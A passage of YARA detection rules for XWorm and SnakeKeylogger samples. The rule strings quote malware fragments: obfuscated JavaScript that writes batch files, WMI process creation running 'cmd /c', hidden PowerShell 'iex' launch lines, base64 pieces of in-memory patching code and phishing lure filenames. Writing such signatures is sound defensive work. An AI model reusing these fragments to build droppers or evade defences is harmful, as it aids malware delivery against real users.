      $s14 = "VectorThread.WriteLine(\"!efeskkrshaxhivs! \\\"%wnjhffcpm%t%wnjhffcpm%a%wnjhffcpm%b%wnjhffcpm%o%wnjhffcpm%n%wnjhffcpm%s%wnjhffcp" ascii /* score: '18.00'*/
      $s15 = "VectorThread.WriteLine(\"!efeskkrshaxhivs! \\\"%hifwukeyz%r%hifwukeyz%f%hifwukeyz%d%hifwukeyz%h%hifwukeyz%a%hifwukeyz%i%hifwukey" ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__00c68e74 {
   meta:
      description = "_subset_batch - file XWorm(signature)_00c68e74.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "00c68e74a6e0dd8973978889085ad90f4660c75acbd402916f98ae03c15101a0"
   strings:
      $x1 = "PulseRouter.WriteLine(\":: Hu3G0H16oanz8AO6C17yxyJPk8tZfKgiL9uaqe+2bLK33dNjxII2Z9KPVKvbvNmH8fMSXsxJy80IlgGwC9YQ8VGaHzUiMybCEeZc8" ascii /* score: '49.00'*/
      $x2 = "GetObject(NexusNetwork).Get(EtherealDatabase).Create('cmd /c ' + MagneticService, null, null, null);" fullword ascii /* score: '32.00'*/
      $s3 = "PulseRouter.WriteLine(\"!sgeepexbtrxztnz! \\\"%dkxikinvq%c%dkxikinvq%b%dkxikinvq%r%dkxikinvq%f%dkxikinvq%i%dkxikinvq%l%dkxikinvq" ascii /* score: '22.00'*/
      $s4 = "dkxikinvq%k%dkxikinvq%v%dkxikinvq%q%dkxikinvq%z=-nop -w h -c \\\"\\\"iex([Text.Enc\\\"\");" fullword ascii /* score: '19.00'*/
      $s5 = "var MagneticService = EtherealManager + '\\\\SpectrumPlatform.bat';" fullword ascii /* score: '18.00'*/
      $s6 = "PulseRouter.WriteLine(\"%rrxaceaojghht%%rrxaceaojghht%c%rrxaceaojghht%%rrxaceaojghht%o%rrxaceaojghht%%rrxaceaojghht%p%rrxaceaojg" ascii /* score: '17.00'*/
      $s7 = "PulseRouter.WriteLine(\"set \\\"sourceFile=%scriptPath%%scriptName%\\\"\");" fullword ascii /* score: '17.00'*/
      $s8 = "PulseRouter.WriteLine(\"!sgeepexbtrxztnz! \\\"%bqrtdllbt%q%bqrtdllbt%m%bqrtdllbt%l%bqrtdllbt%m%bqrtdllbt%m%bqrtdllbt%h%bqrtdllbt" ascii /* score: '16.00'*/
      $s9 = "VdtmgLUXnpZNokx+B4e2t/RK47aVCf+h4MKcoY0YJSXmf+9Db6XTivNPMAoIhD6sdvau6f8Q7Rno+cS2zMwR2fbEyewIWkEh5aG8Xjl2WhKb5uIXQx7srNQ6T0ag+y7n" ascii /* score: '16.00'*/
      $s10 = "kpri1b5tLqCeG2EYa6Ru1nY4Sh9KcpIqXa7lMVi9WsPy3+f0pGSp4iTHVdI6w0WAjdqUVrnLqc7Qyah4Fgxy4e2abGUREd+x4KUnIl16PdSs2H5ODYZ9lK7laN4gxNhV" ascii /* score: '16.00'*/
      $s11 = "PulseRouter.WriteLine(\"!sgeepexbtrxztnz! \\\"%cihjspygm%e%cihjspygm%t%cihjspygm%h%cihjspygm%b%cihjspygm%l%cihjspygm%m%cihjspygm" ascii /* score: '16.00'*/
      $s12 = "OMyjk/kCMKUE0mLViW2XtczSjJ8XaBcXbMnr9m72gLCHzzeKBpYfI3rG+QE7/EbLhzxRhZnLsswlOgtvknKp0paxcUoQxoz8g2uyrKcesLtR+YbuWFQ+VlV2M+WNHrSb" ascii /* score: '16.00'*/
      $s13 = "PulseRouter.WriteLine(\"!sgeepexbtrxztnz! \\\"%bqrtdllbt%q%bqrtdllbt%m%bqrtdllbt%l%bqrtdllbt%m%bqrtdllbt%m%bqrtdllbt%h%bqrtdllbt" ascii /* score: '16.00'*/
      $s14 = "m1Ysj4Qwq942T3ckhZk9tR22lpXAUiRHClzgTXgK19tKB+W/46Zqv5xfyXOPa4Jgd/IWhGET/U0DWp6NZ282tr+HqkUBrdX2kY4JCgFdZ1B0WIBthQjBjf3grFO2Fz1s" ascii /* score: '16.00'*/
      $s15 = "t28mmKJLc3BDSgiK5QQZnpy3MQGSuruk43f/btI4EsSBpa4p+Vfc+O0Vx/RnSBzCOgVB31E9NHFssK2OmCc0NHX6vKY2CMuH/WfwjwX3ude2l+DaWMSIEdLpPb5CePKt" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__1d5ba89a {
   meta:
      description = "_subset_batch - file XWorm(signature)_1d5ba89a.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d5ba89a3e3b4bcc74c987c4da8dbea76e497d5833f552c6eca3d60568f8d450"
   strings:
      $x1 = "NeuralPlatform.WriteLine(\":: h2DlCap5b6XzQ6Gv2//wnNCt7iyVImW3Ow5goAtE7Ky7Y9HA/ohZkV/tdpSgln4NqoZySVwguSLEu6EswJ4m8ULfzgIJQEYS/a" ascii /* score: '39.00'*/
      $s2 = "GetObject(NeutronChannel).Get(BinaryInterface).Create('cmd /c ' + VirtualStream, null, null, null);" fullword ascii /* score: '29.00'*/
      $s3 = "NeuralPlatform.WriteLine(\"%dbyxapzwtde%%sciuwctpzaf%%gygfwmatkqx%%vjxsyiohanq%%cafickctfax%%xssxawkyltf%%gvcapqfevut%%adilvhtfk" ascii /* score: '25.00'*/
      $s4 = "0AGEAdABpAG8AbgBGAGwAYQBnAHMAKABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAE0AZQB0AGgAbwBkAEkAbQBwAGwAQQB0AHQAcgBpAGIAdQB" ascii /* base64 encoded string ' a t i o n F l a g s ( [ S y s t e m . R e f l e c t i o n . M e t h o d I m p l A t t r i b u ' */ /* score: '21.00'*/
      $s5 = "kAGUATQBlAG0ATQBhAG4AYQBnAGUAcgA6ADoAVwByAGkAdABlAEIAeQB0AGUAKABbAEkAbgB0AFAAdAByAF0AOgA6AEEAZABkACgAJABHAHIAZQBuAGEAZABlAFQAYQB" ascii /* base64 encoded string ' e M e m M a n a g e r : : W r i t e B y t e ( [ I n t P t r ] : : A d d ( $ G r e n a d e T a ' */ /* score: '21.00'*/
      $s6 = "1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ASABhAG4AZABsAGUAUgBlAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8ALAA" ascii /* base64 encoded string ' n t i m e . I n t e r o p S e r v i c e s . H a n d l e R e f ( [ I n t P t r ] : : Z e r o , ' */ /* score: '21.00'*/
      $s7 = "nAHIAZQBuAGEAZABlAE0AZQBtAG8AcgB5AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQAMwAyACgAWwBJAG4AdABQAHQAcgBdACgAJAB3AGUAYQBwAG8AbgB" ascii /* base64 encoded string ' r e n a d e M e m o r y M a n a g e r : : R e a d I n t 3 2 ( [ I n t P t r ] ( $ w e a p o n ' */ /* score: '21.00'*/
      $s8 = "sAHkAKAAkAGIAdQBsAGwAZQB0AEEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlACwAIABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAEUAbQBpAHQALgB" ascii /* base64 encoded string ' y ( $ b u l l e t A s s e m b l y N a m e ,   [ S y s t e m . R e f l e c t i o n . E m i t . ' */ /* score: '21.00'*/
      $s9 = "hAGwAZQBkACwAQQBuAHMAaQBDAGwAYQBzAHMALABBAHUAdABvAEMAbABhAHMAcwAnACwAIABbAFMAeQBzAHQAZQBtAC4ATQB1AGwAdABpAGMAYQBzAHQARABlAGwAZQB" ascii /* base64 encoded string ' l e d , A n s i C l a s s , A u t o C l a s s ' ,   [ S y s t e m . M u l t i c a s t D e l e ' */ /* score: '21.00'*/
      $s10 = "uAEEAZABkAHIAZQBzAHMAIABAACgAWwBJAG4AdABQAHQAcgBdACwAWwBVAEkAbgB0ADMAMgBdACwAWwBVAEkAbgB0ADMAMgBdACwAWwBVAEkAbgB0ADMAMgBdAC4ATQB" ascii /* base64 encoded string ' A d d r e s s   @ ( [ I n t P t r ] , [ U I n t 3 2 ] , [ U I n t 3 2 ] , [ U I n t 3 2 ] . M ' */ /* score: '21.00'*/
      $s11 = "oADYAOQAsADEAMQA2ACwAMQAxADkALAA2ADkALAAxADEAOAAsADEAMAAxACwAMQAxADAALAAxADEANgAsADgANwAsADEAMQA0ACwAMQAwADUALAAxADEANgAsADEAMAA" ascii /* base64 encoded string ' 6 9 , 1 1 6 , 1 1 9 , 6 9 , 1 1 8 , 1 0 1 , 1 1 0 , 1 1 6 , 8 7 , 1 1 4 , 1 0 5 , 1 1 6 , 1 0 ' */ /* score: '21.00'*/
      $s12 = "zAHMALAAgADgALAAgACQAZwByAGUAbgBhAGQAZQBPAGwAZABQAHIAbwB0AGUAYwB0AGkAbwBuACwAIABbAHIAZQBmAF0AJABnAHIAZQBuAGEAZABlAE8AbABkAFAAcgB" ascii /* base64 encoded string ' s ,   8 ,   $ g r e n a d e O l d P r o t e c t i o n ,   [ r e f ] $ g r e n a d e O l d P r ' */ /* score: '21.00'*/
      $s13 = "gACQAZwByAGUAbgBhAGQAZQBDAG8AbgB0AGUAeAB0AC4AUwBlAHMAcwBpAG8AbgBTAHQAYQB0AGUALgBMAGEAbgBnAHUAYQBnAGUATQBvAGQAZQAgAD0AIAAnAEYAdQB" ascii /* base64 encoded string ' $ g r e n a d e C o n t e x t . S e s s i o n S t a t e . L a n g u a g e M o d e   =   ' F u ' */ /* score: '21.00'*/
      $s14 = "kAGUATQBlAG0AbwByAHkATQBhAG4AYQBnAGUAcgAgAD0AIABbAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaAB" ascii /* base64 encoded string ' e M e m o r y M a n a g e r   =   [ R u n t i m e . I n t e r o p S e r v i c e s . M a r s h ' */ /* score: '21.00'*/
      $s15 = "oACQARwByAGUAbgBhAGQAZQBUAGEAcgBnAGUAdABBAGQAZAByAGUAcwBzACwAIAA4ACwAIAAwAHgANAAwACwAIABbAHIAZQBmAF0AJABnAHIAZQBuAGEAZABlAE8AbAB" ascii /* base64 encoded string ' $ G r e n a d e T a r g e t A d d r e s s ,   8 ,   0 x 4 0 ,   [ r e f ] $ g r e n a d e O l ' */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__dd5f4cf4 {
   meta:
      description = "_subset_batch - file XWorm(signature)_dd5f4cf4.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dd5f4cf43236b8b7c89369b8a42cf5917f41c88a5d3d785d596058f2b203ac72"
   strings:
      $x1 = "CipherFilter.WriteLine(\":: SKGhPJiBjRdrW7ylpE6oF5mpFvfeJlLYU7RebivtfOzOShyED4iLD8bJY6kKYDx65HKAJKJFtIOs80pehOnmvWRg5ym+tCVRVTFW" ascii /* score: '44.00'*/
      $s2 = "GetObject(HelixDaemon).Get(CosmicGateway).Create('cmd /c ' + CyberneticModule, null, null, null);" fullword ascii /* score: '29.00'*/
      $s3 = "CipherFilter.WriteLine(\"!axyzhbtnwdpjeul! \\\"%ldeskrorq%s%ldeskrorq%e%ldeskrorq%n%ldeskrorq%p%ldeskrorq%u%ldeskrorq%x%ldeskror" ascii /* score: '22.00'*/
      $s4 = "hwYkti6CXLU0c9tfTpfdPHYkdRzPwkuvVpDrv5CqTMpBab8kzJRQoA5BGatWdSwtiQW9n8jxy1CtjE6vXHeQ3d0CSy44Cyi7q15CNA9Kj1FnuD/Tp5FVgIcoERivPCSr" ascii /* score: '19.00'*/
      $s5 = "%ldeskrorq%r%ldeskrorq%s%ldeskrorq%h%ldeskrorq%a=-nop -w h -c \\\"\\\"iex([Text.Enc\\\"\");" fullword ascii /* score: '19.00'*/
      $s6 = "CipherFilter.WriteLine(\"%pbikrneazjues%%pbikrneazjues%c%pbikrneazjues%%pbikrneazjues%o%pbikrneazjues%%pbikrneazjues%p%pbikrneaz" ascii /* score: '17.00'*/
      $s7 = "var CosmicGateway = 'Win32_Process';" fullword ascii /* score: '17.00'*/
      $s8 = "CipherFilter.WriteLine(\"!axyzhbtnwdpjeul! \\\"%btcwrfbvf%e%btcwrfbvf%c%btcwrfbvf%n%btcwrfbvf%q%btcwrfbvf%p%btcwrfbvf%m%btcwrfbv" ascii /* score: '16.00'*/
      $s9 = "CipherFilter.WriteLine(\"!axyzhbtnwdpjeul! \\\"%xdrwnudll%z%xdrwnudll%c%xdrwnudll%t%xdrwnudll%a%xdrwnudll%x%xdrwnudll%c%xdrwnudl" ascii /* score: '16.00'*/
      $s10 = "CipherFilter.WriteLine(\"!axyzhbtnwdpjeul! \\\"%xdrwnudll%z%xdrwnudll%c%xdrwnudll%t%xdrwnudll%a%xdrwnudll%x%xdrwnudll%c%xdrwnudl" ascii /* score: '16.00'*/
      $s11 = "y0KfV9jrwYSnyvJhbwoKS/tl+LBTpv9Fysl0+KN6PmBsjRn7cb2rG7GovgYGXVkSZC2eZIP6L1PuDm1mSIe6AqtisAayExzVP44oU92VIgcqFYMEY1tzzKVCvcqO8qye" ascii /* score: '16.00'*/
      $s12 = "VR/0cD7zXCRKSrqOm7EljpgjLXDJLTQqUp9zP1K7xubYJb2GhcBc/0ckmQY8ZgjfTpKyaDA/VaJO3F3iojAa2gIYVXh2x6keF4RzJLzVAciUPj6WYykaiqZ6WuXd7dmG" ascii /* score: '16.00'*/
      $s13 = "ZxrKhemkLgmUQvXskFiLIPr4m0lnnLoGPrI7FIhNO8N7R7FbUggTmD4MAQvvaKOCmh+Ki6U5XNDZ3gszQHi2T/3+GT0eYYTlBkMZhKi0K9woQrGIQaIcNMzhqERfvTdb" ascii /* score: '16.00'*/
      $s14 = "PAVik2X1DlLVGsltoIa7ig5+gKG7MDjpB2ljKkMfBK3CjmahXGA9Oc99y0K2kBAm+SLrzsj7MaubnhgqOcVhk2cTmFLdTFjwShQAHJ4IERuWxZtxEnA0goow5DQrNFGt" ascii /* score: '16.00'*/
      $s15 = "QJzl6NaVZrzB7nbMGvoTK7IRSY+QvrcPFFAY4S7XbBY9sD63AbBzgtm/5DlCLD7itqmus/d2+hEuB98Jq41GYKnLUIxUFnCNA27H8wZcroBwRyo1sBgEtqMZy1UJAjNY" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__ea00a2a3 {
   meta:
      description = "_subset_batch - file XWorm(signature)_ea00a2a3.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ea00a2a36ddf65471905637823a6932267ba2ebc36620aa82deaa652ec17334a"
   strings:
      $s1 = ":: lZzd4YR+PvC/Fc6kI3dtTyOh2/N6vwZUQn7QhrE+nt2NPNVT7rRg8ARON2dG/EKCzejXy/OBzIhrD0GkDf0/3B7/3nD6oVLh9CsloD7Pbw8aBE1loTQj6LzTUE9Sz" ascii /* score: '29.00'*/
      $s2 = "bJP07JGmIeiq+v/2S2sXUV3cOt/KIT27JcP9RgCiPqekv4JK6BueMA27/Kr0gZV5EroCu7bsQ/7QvKBNzTjqY/9XytEAP0cEA5Y0oa767qsbOSAicpheMLyyIuTJNmZi" ascii /* score: '16.00'*/
      $s3 = "EypbxVQVls+wpKbGaZiMWYhaIhaM0RiRCyp+Ae9klBMSnKB7mf3IK67lbmfpgeY2OBL6FN6U5XVyIkQ3fvZ4Yf4ZaZCVkjTcbjzd/N/6KTREV4LugLE61k6bOamKAl+g" ascii /* score: '16.00'*/
      $s4 = "NZN81SrXFTPf4fr38TBjZChJQ35cyy6epczFE18LZWbAFD3COrhBKc9ApnkXg0J9gqfqusNnJRcqXdBrBIMb5pHSEY/M5tMgnhmbwa8gCtjGvp/xgVZMjLiGiUHdiDDP" ascii /* score: '16.00'*/
      $s5 = "ztcthvyzo%f%ztcthvyzo%e=-nop -c \"\"iex([Text.Encoding\"" fullword ascii /* score: '16.00'*/
      $s6 = "cMQPUq8vexKrKw/W1yvKUnu4TFspwcXN8z7TYt36gEtuYfYuU6bs+432htiSCW75DHIw2n5pIe3SEh7KtJGlegu5yWw2stT/4YUDnCwGts614Obt5X08JLam9520n5EA" ascii /* score: '16.00'*/
      $s7 = "dPwJSLuMm1TfRl5e2RPhL1SHKCWLNsp6FUATWhIuKS+1ueTQQ6pjYfJ4Qv9+AoWcnWJr8yHVeElkCDdNbuwMtlRNitHb+jkwNcmslqc7AW4Cw05Zpjw2EE6j4SPy3QcR" ascii /* score: '16.00'*/
      $s8 = "JSpaWtJ77qmAHUO1Q4/cRZI2LNELmAeXXtncb5U+KnoIlrED8fefoXqijrgO9rIphTdB2PVXjpPKkpBKftP2U4+/ryZuWr9uPsFGeVsmwDXA+GhKYb5OlsPsC9FQ0x08" ascii /* score: '16.00'*/
      $s9 = "WqPH1o5MX/Cka4p2DLPybg95Rpp2sPyNvg7G0FE6ecMWfl06i6hleACzTsf6Sl66RAo69ahGsitjSHvCx97fWUAqT/qwlb3+S9MFAcniKO1yGYl9+yfm6who/dTe7c0n" ascii /* score: '16.00'*/
      $s10 = "!lxlhtcvomzygchx! \"%ztcthvyzo%h%ztcthvyzo%e%ztcthvyzo%q%ztcthvyzo%k%ztcthvyzo%z%ztcthvyzo%r%ztcthvyzo%x%ztcthvyzo%e%ztcthvyzo%d" ascii /* score: '16.00'*/
      $s11 = "TiX3q1TVk/OOE8+3JnKh4AOmfND8ezPW1UxZp+ixEjjoQJWLXVQ1aXXSKnJYp2VMNiLcGYQONK0sG+9pwQUnbVrEDwrKa6vMAzFcb7KDllTv7hkXDrYuTaZ2O9b7gFEO" ascii /* score: '16.00'*/
      $s12 = "kjvupxpt9MudDiAXBXIpzWIw+N43xNbXSW8LvIUAi9crkPZBYEcRewmeYE7Ka9/D2pPJBNgNkTs406ZlhgExRzRQ+M+VYPRIWfLuUkczTzbV4Au/8sc/xzqR+q2quBra" ascii /* score: '16.00'*/
      $s13 = "/X2zhS9KHWYm4Chr/OkJ2UZD+cnayNfwQRDwtWFtpzsFwoMbM8uhjPWSoQyH04zEnIE4GvkMVri/DXjXWL1Q1jXpxntcjc4l8o0SCDnPGkh8eQhxvhxT3FkCrkjprfbX" ascii /* score: '16.00'*/
      $s14 = "9AFAJowxknfiVXtwTGzF/oNEWfiZKOPw4ZBQKHJgZbdZMctTpV0BWH5f33qPYwlDLLQ6bqbhvMhWFTRmX9FwJ4ZZu14BqvuAgazxN0KcMGStSsKTtbj8lTpZYhmEKcX6" ascii /* score: '16.00'*/
      $s15 = "ADAAeABDADAA" ascii /* base64 encoded string ' 0 x C 0 ' */ /* score: '14.00'*/
   condition:
      uint16(0) == 0x6f25 and filesize < 400KB and
      8 of them
}

rule SnakeKeylogger_signature__2 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature).r00"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8909fcac5c76eedbd8210c3436df2ccd8e9626392c4b070e5013b29b695f36a6"
   strings:
      $s1 = "+20250328_CONTINENTAL RESOURCES SDN. BHD.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4fd183ba {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4fd183ba.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4fd183ba00f63128021f0bb45b0b0b92425222efe10c85225ae813bffe598314"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\dWCbVVSdjl\\src\\obj\\Debug\\ZIhi.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s3 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD~" fullword ascii /* score: '27.00'*/
      $s4 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s5 = "get_loginError" fullword ascii /* score: '23.00'*/
      $s6 = "ZIhi.exe" fullword wide /* score: '22.00'*/
      $s7 = "get_loginAfter" fullword ascii /* score: '20.00'*/
      $s8 = "loginError" fullword wide /* score: '18.00'*/
      $s9 = "MMMMMMO" fullword ascii /* reversed goodware string 'OMMMMMM' */ /* score: '16.50'*/
      $s10 = "loginAfter" fullword wide /* score: '15.00'*/
      $s11 = "get_Fitness" fullword ascii /* score: '9.00'*/
      $s12 = "waycount" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule SnakeKeylogger_signature__3 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c0ecdb58505926247a26225b7e50fdf72ae1239d716a0ecb4f6bd549a549ad61"
   strings:
      $s1 = "Hteklif  talebi 20250328 1500x3000x2 mm (10.000 ADET) ENKA GROUP A,S .exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9e408a2b {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9e408a2b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9e408a2b2f751998eb82a75f38924040e88159298634f4d38de814f5750ca824"
   strings:
      $s1 = "OAmT.exe" fullword wide /* score: '22.00'*/
      $s2 = "OAmT.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "Version control systems like Git allow developers to track changes, collaborate effectively, and maintain a complete history of " wide /* score: '13.00'*/
      $s4 = "The best way to learn programming is by practicing regularly, reading other people's code, and constantly challenging yourself w" wide /* score: '12.00'*/
      $s5 = "GetRandomSampleText" fullword ascii /* score: '9.00'*/
      $s6 = "get_TestDate" fullword ascii /* score: '9.00'*/
      $s7 = "GetCharacterCount" fullword ascii /* score: '9.00'*/
      $s8 = "get_TimeElapsed" fullword ascii /* score: '9.00'*/
      $s9 = "get_Accuracy" fullword ascii /* score: '9.00'*/
      $s10 = "GetWordCount" fullword ascii /* score: '9.00'*/
      $s11 = "* :]$tDr" fullword ascii /* score: '9.00'*/
      $s12 = "Test Complete!" fullword wide /* score: '9.00'*/
      $s13 = "Programming is not just about writing code; it's about solving problems, creating solutions, and bringing ideas to life through " wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule SnakeKeylogger_signature__4 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature).vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e59519ad6432f026d70a08a663d21d3937886b211cff5408f29715bf9999676e"
   strings:
      $s1 = "* 2&2%fcfq2cfF2*&8&*f8&cfq2cfF2*2FfW&8&c2,2*&8&*&8&*f8&c2q&2&c2*f&2c2Ffcfq2cfF2X&+&*f8&c*f2cfF2" fullword wide /* score: '12.00'*/
      $s2 = "f!2!2!* f+WFf!Wq&Z&TfZ&!fTWcf%202 fy&Z&!2!2q&8&T&Z&TfZ&&2q&Z&!2Tf!2!2!*&fT2!f!2q&Z&Tf2&&fq2!f!2T2!*8&y&v2!2T&Zc+&ycqfZcF2T&Z&!2T" wide /* score: '12.00'*/
      $s3 = "2!f&2T&2c+*l&!fq2Gf%2T2vf8&Z&!2!2T&Z&T&Z&Tfy& Wf&F&!2Tfc2!2&f!*+WF*c2TcW&+fZ&!fq2Ff!2T2!fZ&Z&!2!2T&y&+&Z&XfZ&!2*&Z&!2Tfv2!W f!f0" wide /* score: '12.00'*/
      $s4 = "Av1vFX!yf+9yF /fZ T Z+Z Ty!yb!G!zTfZ2ffyf+32s Z+ yfG8" fullword wide /* score: '12.00'*/
      $s5 = "!8!2%qFqT2%qF8T&RFq+Z!!$Ty!0!RTF!{Z Z !y!yT Z T Z T+Z !yT Z%!yT)!GFz!0!)TR!0!RTZFFq98!F+T~!0!FTy!0Z%Z%!2 FT,y%T%Z T$Z%!RT%ZA!RT{" wide /* score: '12.00'*/
      $s6 = "TR!XA80 8*$qR FqT2!T!zTlFqR 82!l!GqF~F0 8*T98*!Gq,A %yqX!GFl!9FXTGF9b80 8Zq/ZG!/qR!f!8TZ *Z Z !A!RT2Z2T2Z2T0ZG!zT Z !Oq+FGFA!9F/" wide /* score: '12.00'*/
      $s7 = "T2!Tcyq+!fZ,W F8*8q!8%T Z!+0ZZFG* 8F*8qTFR!R!1c+ql!T ;T,Z2TqZ! *T8*qFAT8!Ty*ZF*8FZq%Z%T%Z&TTy%!Zf 8F!8TT l!RF0!qTZ!*!8XF8!q0Z%!0" wide /* score: '12.00'*/
      $s8 = "b~!)0A!!z)b;cbl)+2y,2Z*,//GAoAw3!Zb));v%$)~29Aw$w2)~&G!,RAW3!Zb)b;v0$zA2G$s~s2y1{fzA2fT!))zZ3*R)AG,00GfAo$w2T!z)WZ0zAGZ,2,G3,R /" wide /* score: '12.00'*/
      $s9 = ",q92A/ZZT z 9)O&f*{GAoAw3lA1G!Z bOZ;0cGc{GO /oO fZTFzsfG$oAw2GAoAo32AXZy0sG!Tqzsff$~ZfA;/Ab/;GO,fZ!8)sGZ1&Of30z2fy12z,A8oT!8bwf{" wide /* score: '12.00'*/
      $s10 = "qW2+!8TfZs/*yv*TTW*f!w9Z $y!Zc*G!W/,ZbT!ZcXTZb!~qA~!!WX9!FAZ /s+T8!9!y$ 8&++ZF!9TGbqFw+y!qZFZA!2 O+ Z,0!ZG1)ZZ*WT,G&!l)+F2Ay!q!T" wide /* score: '12.00'*/
      $s11 = "&W$!Z TTZ!!*qyFT!8TZ!TZf2,bZ!8T!Z!T*2%9TZG!ZT!Zb y$T!+!Z!T!$fy,T!lT!Z!T{2,,TTW!T yTO /y!Z&!Z!ZT Z2T!Z TTZ!!+ff2!!8TT!Z!G 12TT8!T" wide /* score: '12.00'*/
      $s12 = "fFqF!q8!Z!!W!ZT!ZAT!RbTTZ!!O*%y%&8q*!Z!Z!$!3{R&fFzT!Z!T$F% +)ZGT!G*+s+FZ8* ybyfF8Aq*y )TF!!G*b; GzqX ybzFqF1ql +bZ{!Zf*T~ G0ql +" wide /* score: '12.00'*/
      $s13 = "8s!qqZFfFzTZ!TZA2% z!ZT!ZG$%ysTq82!8qfZFF;TqFz!8F1!qqz!T!ZTA2%+0ZFFoT2F/,Fq+FXyFZ!!Z!Z0fR%q2Z&q*8f!2qc8Z!2q$!8F~!fF+)ZGT!w*,O {{" wide /* score: '12.00'*/
      $s14 = "Fl+FZ!TTZ&!90OFTGZT~co+ FcFz!ZT!ZAf%y +q8,&;+G2FFFffF8,+Fq&qqy&fFzT!Z!T$2% )TZ!T!F$R q2F8!&8Fw+F82+F82qq8fF8qbZ!!ZT$&R ;FqFqf2F/" wide /* score: '12.00'*/
      $s15 = "TZ!!8TGl!!ZTT!2FZ!T!TTZ!T!ZTZ8F*)y!!TTAf)!ZTZ!fl%y!!A!2qbZ!T!Zcf0y* Zq2G!!ZToswsAsT23f+!qFFTF8GTf8vf{qF!qFZTZ!*Z!Z!!~!Z0bZ!T!Z,*" wide /* score: '12.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 3000KB and
      8 of them
}

rule SnakeKeylogger_signature__6e011936 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_6e011936.vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6e011936c0946fca97385cad6833661a41cba141307076717e371408e7e202d3"
   strings:
      $s1 = "* 2vWvfvf*2*f,2{&l&" fullword wide /* score: '12.00'*/
      $s2 = "&Z&FW+f!2!2vf!f12!f WX&l&TfOc&fT2!fv2T2!fZ&Z&!Wc2Tcl&T&Z&T*+&!W+&Z&GWXf*2!2%f%fT2!fv2Tc2&Tf+cFf{2!* 2f2!fZ&+&!W&2T&+cq&+&T*lc&2T" wide /* score: '12.00'*/
      $s3 = "2!f!2Tcy&+*8&!f+2!f!2T2*fZcy& WF2Tcy&+&Z&TfZ&!2*&Z&%2+f%2!W&f f{2!* 2T&8&T*lcvf*2F* 2q2!fZ&Z&!2%2Tc2&0&y&TfZ&!2q&8&!2Tf!2!2vfFfT" wide /* score: '12.00'*/
      $s4 = "* 2v2vfcfq2Gf&2" fullword wide /* score: '12.00'*/
      $s5 = "* W W *v*X2!f!2T&Z&TfZ&!fT2!f!2T2!fZ&Z&!2!2T&Z&T&Z&qfZcFWX&Z&!2Tf!2&2v*&*q2!f!2T&Z&TfZ&!ff2!f!WX2 fZ&Z&!2&2T&ZcX&y&TfZ&!2f&Z&!WX" wide /* score: '12.00'*/
